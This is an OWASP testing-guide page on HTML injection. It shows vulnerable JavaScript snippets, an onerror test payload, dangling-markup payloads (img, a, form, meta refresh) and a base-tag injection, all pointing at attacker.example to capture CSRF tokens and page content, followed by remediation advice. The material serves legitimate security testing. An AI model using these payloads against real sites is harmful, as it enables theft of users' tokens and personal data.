# HTML Injection

|ID          |
|------------|
|WSTG-CLNT-03|

## Summary

HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can have many consequences, like disclosure of a user's session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims.

This vulnerability occurs when user input is not correctly sanitized and the output is not encoded. An injection allows the attacker to send a malicious HTML page to a victim. The targeted browser will not be able to distinguish (trust) legitimate parts from malicious parts of the page, and consequently will parse and execute the whole page in the victim's context.

There is a wide range of methods and attributes that could be used to render HTML content. If these methods are provided with an untrusted input, then there is a high risk of HTML injection vulnerability. For example, malicious HTML code can be injected via the `innerHTML` JavaScript method, usually used to render user-inserted HTML code. If strings are not correctly sanitized, the method can enable HTML injection. A JavaScript function that can be used for this purpose is `document.write()`.

The following example shows a snippet of vulnerable code that allows an unvalidated input to be used to create dynamic HTML in the page context:

```js
var userposition=location.href.indexOf("user=");
var user=location.href.substring(userposition+5);
document.getElementById("Welcome").innerHTML=" Hello, "+user;
```

The following example shows vulnerable code using the `document.write()` function:

```js
var userposition=location.href.indexOf("user=");
var user=location.href.substring(userposition+5);
document.write("<h1>Hello, " + user +"</h1>");
```

In both examples, this vulnerability can be exploited with an input such as:

```text
https://vulnerable.site/page.html?user=<img%20src='aaa'%20onerror=alert(1)>
```

This input will add an image tag to the page that will execute arbitrary JavaScript code inserted by the malicious user in the HTML context.

## Test Objectives

- Identify HTML injection points and assess the severity of the injected content.
- Assess what injected markup can do when script execution is blocked, for example by a Content Security Policy.

## How to Test

Consider the following HTML code and script:

```html
<script src="../js/jquery-1.7.1.js"></script>
<script>
function setMessage(){
    var t=location.hash.slice(1);
    $("div[id="+t+"]").text("The DOM is now loaded and can be manipulated.");
}
$(document).ready(setMessage  );
$(window).bind("hashchange",setMessage)
</script>
<body>
    <script src="../js/embed.js"></script>
    <span><a href="#message" > Show Here</a><div id="message">Showing Message1</div></span>
    <span><a href="#message1" > Show Here</a><div id="message1">Showing Message2</div>
    <span><a href="#message2" > Show Here</a><div id="message2">Showing Message3</div>
</body>
```

It is possible to inject HTML code.

### Injection Without Script Execution

An injection point is still worth reporting when scripts can't run, for example because the application filters event handlers or a [Content Security Policy](../02-Configuration_and_Deployment_Management/12-Content_Security_Policy.md) blocks inline script. Plain markup can still leak data or redirect the user.

#### Dangling Markup

If the injection lands before sensitive content in the same page, such as a CSRF token or personal data, an unclosed attribute can capture that content and send it to another site. Inject a tag whose URL attribute is opened but not closed:

```html
<img src='https://attacker.example/collect?
```

The browser reads everything up to the next `'` in the page as part of the URL, including the markup and values that follow the injection point, and requests it from the attacker's server. Check the attacker server's logs for the captured content.

Chromium-based browsers block resource URLs that contain both a raw newline and `<`, which stops the simplest form of this when the captured text spans several lines. Browsers handle other elements differently, so try several and test in more than one browser:

- `<a href='https://attacker.example/?` or `<form action='https://attacker.example/?`, which need the user to click or submit;
- `<meta http-equiv="refresh" content='0;url=https://attacker.example/?`, which navigates without a click;
- an injected `<form>` with no closing tag, placed before a legitimate form, so the legitimate form's fields and token are submitted to the attacker's `action`.

#### Base Tag Injection

An injected `<base href="https://attacker.example/">` changes how every relative URL after it is resolved. Relative script sources, form actions and links then point to the attacker's server. With a nonce-based CSP, an existing script tag that carries a valid nonce and a relative `src` loads from the attacker's server and runs, which turns markup injection into script execution. Check whether the page loads scripts or submits forms with relative URLs after the injection point, and whether the CSP sets `base-uri`.

## Remediation

Encode user input for the HTML context it is written into, so that it can't open new tags or attributes. Set `base-uri 'none'` or `'self'` and a restrictive `form-action` in the Content Security Policy, and keep sensitive values such as CSRF tokens out of pages that also reflect user input where possible.

## References

- [PortSwigger: Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
- [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
